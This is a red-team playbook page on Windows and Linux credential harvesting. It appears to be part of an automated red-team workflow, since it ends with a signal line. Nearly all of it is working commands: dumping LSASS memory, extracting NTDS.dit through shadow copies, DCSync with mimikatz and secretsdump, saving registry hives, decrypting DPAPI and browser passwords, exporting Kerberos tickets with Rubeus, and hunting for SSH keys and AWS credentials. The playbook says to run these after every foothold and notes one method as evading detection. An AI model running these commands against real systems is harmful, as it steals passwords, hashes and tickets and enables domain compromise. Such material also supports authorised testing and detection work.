# RT03: Credential Harvesting

**MITRE:** T1003.001, T1003.006, T1555 | **When:** Always after establishing foothold.

## LSASS Dump (T1003.001)

```powershell
# Method 1: comsvcs.dll MiniDump (built-in, no tools dropped)
$pid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full

# Method 2: Task Manager -> Details -> lsass.exe -> Create Dump (GUI, no detection)

# Method 3: ProcessHacker / SysInternals Procdump (signed binary):
procdump64 -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Method 4: Shadow copy NTDS extraction (no LSASS touch):
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.hive
# Extract offline: secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

```bash
# Parse dump offline:
pypykatz lsa minidump lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp -> sekurlsa::logonpasswords
```

## DCSync (T1003.006) - No LSASS Touch

```bash
# Requires: Domain Admin, Domain Controllers OU admin, or Replication rights (WriteDACL)
# mimikatz (on domain-joined host):
# lsadump::dcsync /domain:corp.local /user:krbtgt
# lsadump::dcsync /domain:corp.local /all /csv  # dump all users

# Remote (from Linux):
secretsdump.py corp.local/admin:'Password!'@<DC_IP> -just-dc-ntlm
secretsdump.py corp.local/admin:'Password!'@<DC_IP> -just-dc-user krbtgt
```

## SAM + LSA Secrets (Local)

```bash
# Registry extraction (local admin):
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive
# Extract: secretsdump.py -sam sam.hive -system system.hive LOCAL

# Remote via CrackMapExec (domain or local admin):
crackmapexec smb <DC_IP> -u admin -p Password! --sam
crackmapexec smb <DC_IP> -u admin -p Password! --lsa
```

## DPAPI Credential Extraction (T1555.004)

```powershell
# Chrome saved passwords (via DPAPI):
# Locate: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Extract Master Key:
mimikatz # sekurlsa::dpapi
# Decrypt: dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

# Windows Credential Manager:
mimikatz # vault::list
mimikatz # vault::cred
```

## Kerberos Ticket Extraction

```bash
# List tickets:
klist
# Rubeus dump all:
Rubeus.exe dump /nowrap
# Rubeus for specific service:
Rubeus.exe dump /service:krbtgt /nowrap
# Export tickets for use on Linux:
Rubeus.exe dump /luid:0x3e4 /nowrap > tickets.b64
# Import on Linux:
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

## Browser + Application Credentials

```bash
# Firefox saved passwords (SQLite):
# %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json + key4.db
python3 firefox_decrypt.py ~/.mozilla/firefox/

# SSH private keys:
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
ls ~/.ssh/

# AWS credentials:
cat ~/.aws/credentials
find / -name "*.pem" -o -name "*.key" 2>/dev/null | grep -v proc
```

**Signal:** `emit_signal CRED_FOUND "LSASS/SAM creds dumped on <host>" "main/redteam" 0.95`
